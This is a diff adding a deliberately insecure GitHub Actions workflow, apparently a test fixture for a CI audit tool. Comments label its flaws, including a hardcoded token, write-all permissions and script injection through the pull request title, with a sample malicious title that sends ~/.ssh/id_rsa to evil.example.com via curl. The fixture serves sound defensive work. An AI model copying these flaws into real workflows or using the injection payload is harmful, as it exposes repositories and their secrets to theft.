@@ -1,0 +1,65 @@
+# ============================================================
+# bad-workflow.yml — GitHub Actions workflow with known issues
+#
+# Run: pipelens audit --workflow examples/workflows/bad-workflow.yml
+#
+# Issues present:
+#   GHA-SEC-001: Hardcoded token in env
+#   GHA-SEC-003: Script injection via PR title
+#   GHA-PERM-001: Missing permissions block
+#   GHA-PERM-002: write-all permissions
+#   GHA-PIN-001: Actions pinned to branch instead of SHA
+#   GHA-CACHE-001: npm install without caching
+# ============================================================
+
+name: Build and Deploy (Bad Example)
+
+# GHA-PERM-002: write-all grants unnecessary privileges
+permissions: write-all
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+# GHA-SEC-001: Hardcoded token — use secrets instead!
+env:
+  DEPLOY_TOKEN: ghp_abc123realtoken456xyz789
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    # No job-level permissions block
+
+    steps:
+      # GHA-PIN-001: Pinned to branch "v4" — should be full SHA
+      - uses: actions/checkout@v4
+
+      # GHA-CACHE-001: npm install without caching
+      - name: Install dependencies
+        run: npm install
+
+      # GHA-SEC-003: Direct interpolation of PR title — script injection risk!
+      # An attacker can create a PR with title: `; curl https://evil.example.com/exfil -d $(cat ~/.ssh/id_rsa)`
+      - name: Echo PR info
+        run: |
+          echo "Building PR: ${{ github.event.pull_request.title }}"
+          echo "Branch: ${{ github.head_ref }}"
+
+      - name: Build
+        run: npm run build
+
+      # GHA-PIN-001: upload-artifact pinned to branch tag
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dist
+          path: dist/
+
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    steps:
+      # GHA-PIN-001: deploy-action pinned to main branch — worst case!
+      - uses: example-org/deploy-action@main
+        with:
+          token: ${{ env.DEPLOY_TOKEN }}
